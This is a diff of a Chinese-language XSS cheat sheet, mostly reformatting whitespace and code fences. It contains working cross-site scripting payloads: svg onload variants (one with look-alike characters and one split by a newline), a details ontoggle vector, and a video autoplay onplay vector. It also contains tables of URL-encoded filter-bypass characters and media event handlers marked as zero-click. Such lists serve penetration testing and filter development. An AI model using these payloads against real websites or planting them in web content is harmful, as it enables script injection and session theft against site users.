@@ -1,4 +1,4 @@
-            十进制值            	                URL编码            	                介绍            
+          十进制值            	           URL编码            	            介绍            
             47            	                %2F            	                正斜杠            
             13            	                %0D            	                回车            
             12            	                %0C            	                分页符            
@@ -12,8 +12,9 @@
 ```
 
 
-
+```
 <svg/οnlοad=alert(1)> 
+```
 
 ```
 <svg
@@ -47,17 +48,20 @@ onload=alert(1)><svg> # newline char
 <details open ontoggle="alert()">  (chrome & opera only)
 ```
 
-
-
+```
 事件名称 标签 备注
- onplay video, audio 适用于0-click：结合HTML的autoplay属性以及结合有效的视频/音频
- onplaying video, audio 适用于0-click: 结合HTML的autoplay属性以及结合有效的视频/音频
- oncanplay video, audio 必须链接有效的视频/音频
- onloadeddata video, audio 必须链接有效的视频/音频
- onloadedmetadata video, audio 必须链接有效的视频/音频
- onprogress video, audio 必须链接有效的视频/音频
- onloadstart video, audio 潜在的0-click向量
- oncanplay video, audio 必须链接有效的视频/音频
+onplay video, audio 适用于0-click：结合HTML的autoplay属性以及结合有效的视频/音频
+onplaying video, audio 适用于0-click: 结合HTML的autoplay属性以及结合有效的视频/音频
+oncanplay video, audio 必须链接有效的视频/音频
+onloadeddata video, audio 必须链接有效的视频/音频
+onloadedmetadata video, audio 必须链接有效的视频/音频
+onprogress video, audio 必须链接有效的视频/音频
+onloadstart video, audio 潜在的0-click向量
+oncanplay video, audio 必须链接有效的视频/音频
+```
+
+
+
 
 ```
 <video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
